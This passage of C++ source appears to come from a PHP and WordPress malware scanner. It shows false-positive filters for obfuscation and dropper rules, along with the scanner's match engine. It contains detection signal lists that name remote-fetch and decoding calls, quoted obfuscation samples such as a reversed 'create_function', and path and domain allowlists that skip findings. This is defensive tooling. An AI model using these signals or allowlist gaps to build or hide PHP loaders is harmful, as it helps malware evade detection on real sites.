    // where it lands. TranslatePress exporting its own translation bundle as
    // `file_put_contents("woocommerce-{$lang}.zip", file_get_contents($local_po))` is a
    // plugin doing its job, and it was all 13 findings on one production host.
    if (ruleCode == "DRP008") {
        const size_t start = (ctx.matchOffset > 100) ? ctx.matchOffset - 100 : 0;
        const size_t searchEnd = std::min(ctx.matchOffset + 300, ctx.content.size());
        const std::string_view around = ctx.content.substr(start, searchEnd - start);

        static constexpr std::string_view kDropperSignals[] = {
            "$_GET", "$_POST", "$_REQUEST", "$_COOKIE", "$_FILES", "php://input",
            "base64_decode", "gzinflate", "curl_exec",
            "file_get_contents('http", "file_get_contents(\"http",
        };
        for (auto signal : kDropperSignals) {
            if (around.find(signal) != std::string_view::npos) {
                return true;
            }
        }
        return false;
    }

    // OBF003: pack() hex obfuscation
    // False positives: Legitimate crypto libraries use pack('H*', ...) for binary data
    if (ruleCode == "OBF003") {
        // Well-known constants that are *always* what they look like. The DER-encoded
        // rsaEncryption OID accounted for all 30 findings on one production host - it is
        // how firebase/php-jwt and phpseclib write an RSA algorithm identifier, and no
        // payload is 15 bytes long. Checked first, because it holds wherever the file sits.
        // The DER-encoded rsaEncryption AlgorithmIdentifier.
        static constexpr std::string_view kRsaEncryptionOid = "300d06092a864886f70d0101010500";
        if (ctx.matchedText.find(kRsaEncryptionOid) != std::string_view::npos) {
            return false;
        }

        // Path tests are lowercased, because a vendored copy is as likely to be spelled
        // `PHPSecLib` or `Crypt` as `phpseclib`. OBF036 already did this; OBF003 did not,
        // which is why one capitalised copy inside Forminator kept reporting.
        std::string path(ctx.filePath);
        std::transform(path.begin(), path.end(), path.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });

        // `third-party/` and `vendor-prefixed/` are the same thing as `vendor/`: Site Kit,
        // Forminator, WPForms and Fluent SMTP all prefix their dependencies into one of
        // these rather than leaving them under vendor/.
        static constexpr std::string_view kLibraryPaths[] = {
            "/vendor/", "third-party/", "third_party/", "vendor-prefixed/",
            "phpseclib", "/crypt/", "sodium", "openssl", "php-jwt",
        };
        for (auto fragment : kLibraryPaths) {
            if (path.find(fragment) != std::string::npos) {
                return false;  // Skip - crypto library
            }
        }

        return true;
    }

    // OBF004: Long base64 encoded payload
    // False positives: JS files may contain legitimate long base64 strings (icons, images)
    // Only flag in PHP files or if base64 is being decoded
    if (ruleCode == "OBF004") {
        // Skip base64 in JS files - often legitimate embedded data
        if (ctx.filePath.find(".js") != std::string_view::npos) {
            return false;  // Skip - JS files commonly have embedded base64 images
        }

        return true;  // Keep for PHP files
    }

    // OBF010: gzuncompress with base64
    // False positives: CMS plugins (RevSlider, etc.) use gzuncompress(base64_decode())
    // for legitimate data import/export (slider configs, theme options)
    // Real malware: decoded content is eval'd or written as PHP
    // Legitimate: decoded content is json_decoded for data processing
    if (ruleCode == "OBF010") {
        // Skip in known CMS plugin paths that legitimately use compressed data
        static const std::vector<std::string_view> legitimatePaths = {
            "revslider",            // Revolution Slider
            "revolution-slider",
            "LayerSlider",
            "theme-options",
            "redux-framework",      // Redux Options Framework
            "vendor/",
            "vendor-prefixed/",
        };

        for (const auto& path : legitimatePaths) {
            if (ctx.filePath.find(path) != std::string_view::npos) {
                return false;  // Skip - known CMS plugin
            }
        }

        // Check if the decoded data is used for data processing (json_decode)
        // vs code execution (eval). Look within ~300 chars after match.
        size_t searchEnd = std::min(ctx.matchOffset + 300, ctx.content.size());
        std::string_view afterMatch = ctx.content.substr(ctx.matchOffset, searchEnd - ctx.matchOffset);

        if (afterMatch.find("json_decode") != std::string_view::npos) {
            return false;  // Skip - data processing, not code execution
        }

        return true;
    }

    // OBF011: rawurldecode with base64
    // False positives: WPBakery Page Builder (js_composer) stores shortcode content
    // as rawurldecode(base64_decode(...)) - this is by design for safe HTML storage.
    // Also used by other CMS builders for content encoding.
    // Real malware: raw payload decoding followed by eval/exec
    // Legitimate: content displayed via htmlentities() or used in templates
    if (ruleCode == "OBF011") {
        // Skip in known CMS page builder paths
        static const std::vector<std::string_view> legitimatePaths = {
            "js_composer",          // WPBakery Page Builder
            "wpbakery",
            "visual-composer",
            "elementor",            // Elementor page builder
            "divi",                 // Divi theme builder
            "beaver-builder",
            "vendor/",
            "vendor-prefixed/",
        };

        for (const auto& path : legitimatePaths) {
            if (ctx.filePath.find(path) != std::string_view::npos) {
                return false;  // Skip - known CMS builder plugin
            }
        }

        // Check line context: if htmlentities or strip_tags is nearby,
        // this is display/sanitization code, not payload execution
        std::string_view line = getLineAtOffset(ctx.content, ctx.matchOffset);
        if (line.find("htmlentities") != std::string_view::npos ||
            line.find("htmlspecialchars") != std::string_view::npos ||
            line.find("strip_tags") != std::string_view::npos ||
            line.find("esc_html") != std::string_view::npos ||
            line.find("esc_attr") != std::string_view::npos ||
            // wp_kses is the one WordPress code actually reaches for, and it was the one
            // missing: The7's icon shortcode writes
            // `wp_kses( rawurldecode( base64_decode( $attributes['icon'] ) ), ... )`.
            line.find("wp_kses") != std::string_view::npos) {
            return false;  // Skip - output sanitization context
        }

        return true;
    }

    // OBF005: strrev() function hiding
    //
    // The pattern finds `strrev()` over concatenated literals, which is the right shape - but
    // the shape alone is not the technique. What the technique produces is a *dangerous
    // name*: `strrev("noi"."tcnuf"."_eta"."erc")` is "create_function". The ThemeREX theme
    // family (veil, promo, catamaran, proguards, detailx, yacht-rental) uses the same trick
    // to spell `strrev('e' . 'mar' . 'fi')` - "iframe" - which hides nothing worth hiding.
    //
    // So fold the literals and reverse them, exactly as PHP would, and ask whether the answer
    // names something sensitive. analysis::isSensitiveIdentifier already owns that list and
    // is shared with OBF024/OBF025.
    if (ruleCode == "OBF005") {
        // Concatenate the quoted literals inside the matched call. Comments between the
        // fragments are skipped implicitly: they contribute no quoted text.
        std::string folded;
        const std::string_view text = ctx.matchedText;
        for (size_t i = 0; i < text.size(); ++i) {
            const char quote = text[i];
            if (quote != '\'' && quote != '"') continue;
            size_t j = i + 1;
            std::string piece;
            while (j < text.size() && text[j] != quote) {
                if (text[j] == '\\' && j + 1 < text.size()) ++j;
                piece.push_back(text[j]);
                ++j;
            }
            if (j >= text.size()) break;   // unterminated - stop folding
            folded += piece;
            i = j;
        }

        if (folded.empty()) return true;   // nothing to fold: leave the match alone
        std::reverse(folded.begin(), folded.end());
        return analysis::isSensitiveIdentifier(folded);
    }


    // CRED006: Suspicious TLD in URL
    // False positives: Legitimate domains like amazon.cn, weibo.cn, etc.
    // Only flag if the domain is NOT in the whitelist of known legitimate domains
    if (ruleCode == "CRED006") {
        // Whitelist of known legitimate domains using suspicious TLDs
        static const std::vector<std::string_view> legitimateDomains = {
            "amazon.cn",        // Amazon China
            "amazon.ru",        // Amazon Russia
            "alibaba.cn",       // Alibaba
            "taobao.cn",        // Taobao
            "weibo.cn",         // Weibo
            "baidu.cn",         // Baidu
            "qq.cn",            // Tencent QQ
            "163.cn",           // NetEase
            "sina.cn",          // Sina
            "jd.cn",            // JD.com
            "read.amazon.cn",   // Amazon Kindle China
        };

        // Check if matched text contains any whitelisted domain
        for (const auto& domain : legitimateDomains) {
            if (ctx.matchedText.find(domain) != std::string_view::npos) {
                return false;  // Skip - legitimate domain
            }
        }

        return true;  // Keep the match - unknown domain
    }

    // DRP001: Remote code loader (file_get_contents + eval)
    // False positives: CMS plugins that fetch data from legitimate APIs
    // RevSlider fetches Google Fonts from googleapis.com, WordPress core fetches
    // from api.wordpress.org, etc. The .*?eval regex can span hundreds of lines
    // matching file_get_contents('https://...') with an unrelated eval() elsewhere.
    if (ruleCode == "DRP001") {
        // Whitelist of known legitimate API domains
        static const std::vector<std::string_view> legitimateDomains = {
            "googleapis.com",       // Google APIs (Fonts, Maps, etc.)
            "api.wordpress.org",    // WordPress API
            "downloads.wordpress.org",
            "wordpress.org",
            "github.com",
            "raw.githubusercontent.com",
            "api.github.com",
            "packagist.org",
            "getcomposer.org",
            "cdn.jsdelivr.net",
            "cdnjs.cloudflare.com",
            "unpkg.com",
            "fonts.google.com",
            "fonts.gstatic.com",
            "api.jquery.com",
            "registry.npmjs.org",
        };

        // Check if the matched URL contains a whitelisted domain
        for (const auto& domain : legitimateDomains) {
            if (ctx.matchedText.find(domain) != std::string_view::npos) {
                return false;  // Skip - legitimate API call
            }
        }

        // Also skip if this is in a known CMS plugin doing API calls
        static const std::vector<std::string_view> legitimatePaths = {
            "revslider",
            "googlefonts",
            "google-fonts",
            "vendor/",
            "vendor-prefixed/",
        };

        for (const auto& path : legitimatePaths) {
            if (ctx.filePath.find(path) != std::string_view::npos) {
                // Even in known paths, check if eval is close to the URL fetch
                // If eval is >500 chars away, it's likely a coincidental match
                size_t searchEnd = std::min(ctx.matchOffset + 500, ctx.content.size());
                std::string_view nearContext = ctx.content.substr(ctx.matchOffset, searchEnd - ctx.matchOffset);
                if (nearContext.find("eval") == std::string_view::npos) {
                    return false;  // Skip - eval is far from the fetch, likely unrelated
                }
            }
        }

        return true;
    }

    // No filter for this rule - keep the match
    return true;
}

// Get the previous line (before the line containing offset)
static std::string_view getPreviousLine(std::string_view content, size_t offset) {
    // Find current line start
    size_t lineStart = content.rfind('\n', offset > 0 ? offset - 1 : 0);
    if (lineStart == std::string_view::npos || lineStart == 0) {
        return {};  // No previous line
    }

    // Find previous line start
    size_t prevLineStart = content.rfind('\n', lineStart - 1);
    prevLineStart = (prevLineStart == std::string_view::npos) ? 0 : prevLineStart + 1;

    return content.substr(prevLineStart, lineStart - prevLineStart);
}

// Check if match has suppression comment nearby (same line or previous line)
bool MatchEngine::hasSuppression(std::string_view content, size_t offset) {
    std::string_view currentLine = getLineAt(content, offset);
    if (lineContainsSuppression(currentLine)) {
        return true;
    }

    std::string_view prevLine = getPreviousLine(content, offset);
    if (!prevLine.empty() && lineContainsSuppression(prevLine)) {
        return true;
    }

    return false;
}

// Calculate byte offset from line/column
static size_t lineColToOffset(std::string_view content, size_t line, size_t col) {
    size_t currentLine = 1;
    size_t lineStart = 0;

    for (size_t i = 0; i < content.size(); ++i) {
        if (currentLine == line) {
            return lineStart + col - 1;
        }
        if (content[i] == '\n') {
            ++currentLine;
            lineStart = i + 1;
        }
    }

    // If we're looking for the last line
    if (currentLine == line) {
        return lineStart + col - 1;
    }

    return 0;
}

// Get context (surrounding text) for a match
// Keep it short - just for quick glimpses, not debugging
static std::string getContext(std::string_view content, size_t offset, size_t matchLen, size_t contextLen = 120) {
    // Get some context before and after
    size_t contextBefore = 20;  // Just show a bit before
    size_t contextAfter = contextLen - contextBefore;

    size_t start = (offset > contextBefore) ? offset - contextBefore : 0;
    size_t end = std::min(offset + matchLen + contextAfter, content.size());

    std::string ctx(content.substr(start, end - start));

    // Fold the whitespace that only affects layout, so a quote stays on one line.
    for (char& c : ctx) {
        if (c == '\n' || c == '\r' || c == '\t') c = ' ';
    }

    // Everything else the file might contain is escaped rather than printed. This
    // quote comes out of malware; ESC in it would drive the terminal instead of
    // describing the finding. Truncation happens inside sanitizeAndTruncate so a
    // cut can never leave a dangling escape for the next output to complete.
    return safe_text::sanitizeAndTruncate(ctx, contextLen);
}

void MatchEngine::loadRules(const std::vector<RuleConfig>& configs) {
    rules_.clear();
    rules_.reserve(configs.size());

    for (const auto& config : configs) {
        auto rule = std::make_unique<Rule>(config);
        if (rule->isValid()) {
            rules_.push_back(std::move(rule));
        }
    }
}

// A rule with neither patterns nor an analyzer has nothing to run against file
// content: the ARC rules are raised by the archive scanner from an entry list.
// Loading them here would walk every file for a rule that can never match.
static bool scansContent(const rules::BuiltinRule* rule) {
    return rule && (!rule->patterns.empty() || rule->analyzer != nullptr);
}

void MatchEngine::loadBuiltinCategory(rules::Category category) {
    const auto& registry = rules::Registry::instance();
    auto categoryRules = registry.getByCategory(category);

    for (const auto* rule : categoryRules) {
        if (!scansContent(rule)) {
            continue;
        }
        std::string code = rule->code.toString();
        if (disabledRules_.find(code) == disabledRules_.end()) {
            // Check if already loaded
            bool alreadyLoaded = false;
            for (const auto* existing : builtinRules_) {
                if (existing == rule) {
                    alreadyLoaded = true;
                    break;
                }
            }
            if (!alreadyLoaded) {
                builtinRules_.push_back(rule);
            }
        }
    }
    rebuildPrefilter();
}

void MatchEngine::loadAllBuiltinRules() {
    const auto& registry = rules::Registry::instance();
    builtinRules_.clear();

    for (const auto* rule : registry.getAllRules()) {
        if (!scansContent(rule)) {
            continue;
        }
        std::string code = rule->code.toString();
        if (disabledRules_.find(code) == disabledRules_.end()) {
            builtinRules_.push_back(rule);
        }
    }
    rebuildPrefilter();
}

void MatchEngine::loadBuiltinRule(std::string_view code) {
    const auto* rule = rules::getRuleByCode(code);
    if (scansContent(rule)) {
        std::string codeStr(code);
        if (disabledRules_.find(codeStr) == disabledRules_.end()) {
            // Check if already loaded
            bool alreadyLoaded = false;
            for (const auto* existing : builtinRules_) {
                if (existing == rule) {
                    alreadyLoaded = true;
                    break;
                }
            }
            if (!alreadyLoaded) {
                builtinRules_.push_back(rule);
            }
        }
    }
    rebuildPrefilter();
}

void MatchEngine::disableBuiltinRule(std::string_view code) {
    disabledRules_.insert(std::string(code));

    // Remove from loaded rules if present
    const auto* ruleToRemove = rules::getRuleByCode(code);
    if (ruleToRemove) {
        builtinRules_.erase(
            std::remove(builtinRules_.begin(), builtinRules_.end(), ruleToRemove),
            builtinRules_.end()
        );
    }
    rebuildPrefilter();
}

void MatchEngine::rebuildPrefilter() {
    prefilter_ = LiteralPrefilter{};
    gateHandles_.clear();
    gateHandles_.reserve(builtinRules_.size());
    residualSet_.reset();
    residualRuleOf_.clear();

    RE2::Options setOpts;
    setOpts.set_log_errors(false);
    setOpts.set_dot_nl(true);          // same as PatternCache, or the Set disagrees
    setOpts.set_case_sensitive(true);  // caseless patterns are folded in as (?i:...)
    setOpts.set_max_mem(64 << 20);
    auto residual = std::make_unique<RE2::Set>(setOpts, RE2::UNANCHORED);
    bool residualUsable = true;
    size_t residualCount = 0;

    for (size_t ruleIdx = 0; ruleIdx < builtinRules_.size(); ++ruleIdx) {
        const auto* rule = builtinRules_[ruleIdx];
        std::vector<size_t> handles;
        handles.reserve(rule->patterns.size());
        for (const auto& pattern : rule->patterns) {
            const size_t handle = prefilter_.add(pattern);
            handles.push_back(handle);

            if (handle == LiteralPrefilter::kAlwaysRun && residualUsable) {
                const std::string expr = pattern.case_insensitive
                                             ? "(?i:" + std::string(pattern.regex) + ")"
                                             : std::string(pattern.regex);
                if (residual->Add(expr, nullptr) < 0) {
                    residualUsable = false;  // fall back to running them all
                } else {
                    residualRuleOf_.push_back(ruleIdx);
                    ++residualCount;
                }
            }
        }
        gateHandles_.push_back(std::move(handles));
    }

    prefilter_.compile();

    if (residualUsable && residualCount > 0 && residual->Compile()) {
        residualSet_ = std::move(residual);
    } else {
        residualRuleOf_.clear();  // no Set: the literal-less patterns just always run
    }
}

void MatchEngine::addRule(std::unique_ptr<Rule> rule) {
    if (rule && rule->isValid()) {
        rules_.push_back(std::move(rule));
    }
}

std::vector<FileMatch> MatchEngine::match(std::string_view content, std::string_view filePath) const {
    std::vector<FileMatch> allMatches;

    // Match custom YAML rules
    for (const auto& rule : rules_) {
        auto ruleMatches = rule->match(content);

        // Check each match for suppression comments
        for (auto& match : ruleMatches) {
            if (hasSuppression(content, match.offset)) {
                match.suppressed = true;
                match.originalSeverity = match.severity;
                match.severity = Severity::Low;  // Downgrade to Low
            }
        }

        allMatches.insert(allMatches.end(),
                          std::make_move_iterator(ruleMatches.begin()),
                          std::make_move_iterator(ruleMatches.end()));
    }

    // One pass to find which gate literals this file contains, so patterns whose
    // required text is absent are never run. See LiteralPrefilter.h - this cannot
    // change results, only skip work that provably cannot match.
    const auto present = prefilter_.scan(content);

    // Second pass for the patterns no literal can gate: one Set instead of one
    // walk each. Empty when the Set is unavailable, which means "run them all".
    std::vector<char> residualRuleHit;
    if (residualSet_) {
        residualRuleHit.assign(builtinRules_.size(), 0);
        std::vector<int> hits;
        if (residualSet_->Match(re2::StringPiece(content.data(), content.size()), &hits)) {
            for (int id : hits) {
                if (id >= 0 && static_cast<size_t>(id) < residualRuleOf_.size()) {
                    residualRuleHit[residualRuleOf_[static_cast<size_t>(id)]] = 1;
                }
            }
        }
    }

    // Match built-in rules with context-aware filtering
    for (size_t ruleIdx = 0; ruleIdx < builtinRules_.size(); ++ruleIdx) {
        const auto* builtinRule = builtinRules_[ruleIdx];

        // An analyzer rule has no patterns to gate; it always runs.
        const std::vector<size_t>* handles =
            ruleIdx < gateHandles_.size() ? &gateHandles_[ruleIdx] : nullptr;
        if (handles && !handles->empty()) {
            bool anyAllowed = false;
            for (size_t h : *handles) {
                if (h == LiteralPrefilter::kAlwaysRun) {
                    // Gated by the residual Set instead, when there is one.
                    if (residualRuleHit.empty() || residualRuleHit[ruleIdx]) {
                        anyAllowed = true;
                        break;
                    }
                    continue;
                }
                if (prefilter_.allows(h, present)) { anyAllowed = true; break; }
            }
            if (!anyAllowed) continue;
        }

        auto matches = builtinRule->findMatches(content);
        std::string ruleCode = builtinRule->code.toString();

        for (const auto& match : matches) {
            size_t offset = lineColToOffset(content, match.line, match.column);

            // Apply context-aware filter to reduce false positives
            MatchContext ctx{
                .content = content,
                .filePath = filePath,
                .matchOffset = offset,
                .matchLine = match.line,
                .matchColumn = match.column,
                .matchedText = match.matched
            };

            if (!applyContextFilter(ruleCode, ctx)) {
                continue;  // Skip this match (filtered out as likely false positive)
            }

            FileMatch fm;
            fm.ruleName = std::string(builtinRule->name);
            fm.severity = builtinRule->severity;
            fm.originalSeverity = builtinRule->severity;
            fm.category = ruleCode;  // Use rule code as category (e.g., "WS001")
            fm.patternType = "builtin";
            fm.line = match.line;
            fm.column = match.column;
            fm.offset = offset;
            // match.matched is a slice of the scanned file - untrusted. match.note is
            // written by the analyzer, but goes through the same path for uniformity.
            fm.matchedText = match.note.empty() ? safe_text::sanitize(match.matched)
                                                : match.note;
            fm.context = getContext(content, fm.offset, match.matched.size());

            // Analyzer rules explain themselves - the raw source alone does not
            if (!match.note.empty()) {
                fm.context = match.note + " | " + fm.context;
            }

            // Check for suppression
            if (hasSuppression(content, fm.offset)) {
                fm.suppressed = true;
                fm.originalSeverity = fm.severity;
                fm.severity = Severity::Low;
            }

            allMatches.push_back(std::move(fm));
        }
    }

    return allMatches;
}

size_t MatchEngine::patternCount() const {
    size_t total = 0;
    for (const auto& rule : rules_) {
        total += rule->patternCount();
    }
    // Add builtin patterns - an analyzer rule carries no patterns but counts as one check
    for (const auto* rule : builtinRules_) {
        total += rule->analyzer ? 1 : rule->patterns.size();
    }
    return total;
}

void MatchEngine::clear() {
    rules_.clear();
    builtinRules_.clear();
    disabledRules_.clear();
    rebuildPrefilter();
}

}  // namespace lyxbosa
